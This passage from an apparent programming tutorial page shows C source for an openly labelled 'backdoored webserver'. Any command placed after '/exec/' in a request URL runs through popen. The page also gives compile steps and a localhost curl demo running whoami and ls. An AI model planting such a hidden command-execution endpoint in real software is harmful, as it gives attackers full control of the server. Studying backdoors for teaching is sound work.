<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">exec_location</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="c1">//perror(&quot;Error getting command from URL&quot;);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;No command in URL!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">command</span><span class="p">;</span>
<span class="w">        </span><span class="c1">//exit(1);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Get everything after the last character of &quot;/exec/&quot; in the URL</span>
<span class="w">    </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exec_location</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="s">&quot;/exec/&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Print the command for debug</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Command: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">command</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Return the command</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">command</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// This function executes a command and returns the output </span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">execute_command_return_output</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">command_in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="c1">// Local buffer to store a line of output</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">local_buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

<span class="w">    </span><span class="c1">// The output of the command that will be returned from this function</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// The size of the output</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">output_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// The HTML break tag</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">html_break</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// string that redirects stderr to stdout</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">redirect_std_err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot; 2&gt;&amp;1&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Get the length of the command</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">command_in_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">command_in</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Get the length of the redirect string</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">redirect_std_err_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">redirect_std_err</span><span class="p">);</span><span class="w">    </span>

<span class="w">    </span><span class="c1">// Allocate memory for the redirected command.  This will be a string that contains the command</span>
<span class="w">    </span><span class="c1">// and the redirect string. (e.g. &quot;ls -l 2&gt;&amp;1&quot;)</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">redirected_command_in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">command_in_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">redirect_std_err_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Copy the command to the redirected command</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">redirected_command_in</span><span class="p">,</span><span class="w"> </span><span class="n">command_in</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Append the redirect string to the redirected command</span>
<span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">redirected_command_in</span><span class="p">,</span><span class="w"> </span><span class="n">redirect_std_err</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Use the popen function to execute the command and return the output to a stream</span>
<span class="w">    </span><span class="kt">FILE</span><span class="o">*</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">popen</span><span class="p">(</span><span class="n">command_in</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Read the output a line at a time and store it in the local buffer</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stream</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="c1">// Tack on an HTML break to the end of each line of output</span>
<span class="w">        </span><span class="c1">//strcat(local_buffer, html_break);</span>

<span class="w">        </span><span class="c1">// Get the size of a line of output</span>
<span class="w">        </span><span class="kt">size_t</span><span class="w"> </span><span class="n">buffer_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Reallocate memory for the output</span>
<span class="w">        </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">realloc</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="n">output_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">buffer_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Copy a line of output to the output string</span>
<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">output</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">output_size</span><span class="p">,</span><span class="w"> </span><span class="n">local_buffer</span><span class="p">,</span><span class="w"> </span><span class="n">buffer_length</span><span class="p">);</span>
<span class="w">        </span>
<span class="w">        </span><span class="c1">// Update the output size</span>
<span class="w">        </span><span class="n">output_size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">buffer_length</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// Add the null character to the end of the output string</span>
<span class="w">        </span><span class="n">output</span><span class="p">[</span><span class="n">output_size</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Close the stream</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error closing stream&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Return the output of the command</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="compile-the-code">
<h2>Compile the Code<a class="headerlink" href="#compile-the-code" title="Link to this heading">#</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="n">curr_dir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<span class="n">curr_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>

<span class="n">code_dir</span> <span class="o">=</span> <span class="n">curr_dir</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="s2">&quot;C_Code&quot;</span>
<span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">code_dir</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">exec_status</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;gcc -ggdb3 -o backdoored_webserver backdoored_webserver.c&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="run-the-code">
<h2>Run the Code<a class="headerlink" href="#run-the-code" title="Link to this heading">#</a></h2>
<p>Running the code starts a webserver that listens on the specified port as an argument. You can access the server by sending HTTP requests to the server’s IP address and port.  In this example, we will start the server on port 8080 like so:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./backdoored_webserver<span class="w"> </span><span class="m">8080</span>
</pre></div>
</div>
<p>The output is as follows:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">The</span> <span class="n">number</span> <span class="n">of</span> <span class="n">command</span> <span class="n">line</span> <span class="n">arguments</span> <span class="ow">is</span> <span class="o">-&gt;</span> <span class="mi">1</span>
<span class="n">The</span> <span class="n">command</span> <span class="n">line</span> <span class="n">argument</span> <span class="ow">is</span> <span class="mi">8080</span>
</pre></div>
</div>
<p>In another terminal, we use <code class="docutils literal notranslate"><span class="pre">curl</span></code> to send an HTTP request to the server.  The curl command is as follows:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://127.0.0.1:8080
</pre></div>
</div>
<p>and the response is:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">404</span> <span class="n">Not</span> <span class="n">Found</span>
</pre></div>
</div>
<p>However, if we send a request with the <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> keyword, we can execute commands on the server. For example:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://127.0.0.1:8080/exec/whoami
</pre></div>
</div>
<p>The response will be:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>

<span class="n">haxor</span>
</pre></div>
</div>
<p>Another example:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://127.0.0.1:8080/exec/ls
</pre></div>
</div>
<p>The response will be:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>

<span class="n">backdoored_webserver</span>
<span class="n">backdoored_webserver</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
</section>
</section>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "markkhusid/MKDynamics_Website_V2",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "py311_env"
        },
        kernelOptions: {
            name: "py311_env",
            path: "./Sections/Computer_Programming/C/Backdoored_Webserver"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'py311_env'</script>

                </article>
              

              
              
              
              
                <footer class="prev-next-footer d-print-none">
                  
<div class="prev-next-area">
    <a class="left-prev"
       href="../c__HEAD__.html"
       title="previous page">
      <i class="fa-solid fa-angle-left"></i>
      <div class="prev-next-info">
        <p class="prev-next-subtitle">previous</p>
        <p class="prev-next-title">C Programming</p>
      </div>
    </a>
    <a class="right-next"
       href="../../CPP/cpp.html"
       title="next page">
      <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">C++ Programming</p>
      </div>
      <i class="fa-solid fa-angle-right"></i>
    </a>
</div>
                </footer>
              
            </div>
            
            
              
                <dialog id="pst-secondary-sidebar-modal"></dialog>
                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">


  <div class="sidebar-secondary-item">
  <div class="page-toc tocsection onthispage">
    <i class="fa-solid fa-list"></i> Contents
  </div>
  <nav class="bd-toc-nav page-toc">
    <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#introduction">Introduction</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#explanation-of-code-by-chatgpt-4o-openai">Explanation of Code by ChatGPT 4o (OpenAI)</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#key-functionalities"><strong>Key Functionalities</strong></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#main-components"><strong>Main Components</strong></a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#global-definitions"><strong>Global Definitions</strong></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#main-function"><strong>Main Function</strong></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#helper-functions"><strong>Helper Functions</strong></a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#key-vulnerabilities-and-concerns"><strong>Key Vulnerabilities and Concerns</strong></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#recommendations"><strong>Recommendations</strong></a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#program-code">Program Code</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#compile-the-code">Compile the Code</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#run-the-code">Run the Code</a></li>
</ul>
  </nav></div>

</div></div>
              
            
          </div>
          <footer class="bd-footer-content">
            
<div class="bd-footer-content__inner container">
  
  <div class="footer-item">
    
<p class="component-author">
By Mark Khusid
</p>

  </div>
  
  <div class="footer-item">
    

  </div>
  
  <div class="footer-item">
    
  </div>
  
  <div class="footer-item">
    
  </div>
  
</div>
          </footer>
        

      </main>
    </div>
  </div>
  
  <!-- Scripts loaded after <body> so the DOM is not blocked -->
  <script defer src="../../../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf"></script>
<script defer src="../../../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf"></script>

  <footer class="bd-footer">
  </footer>
  </body>
</html>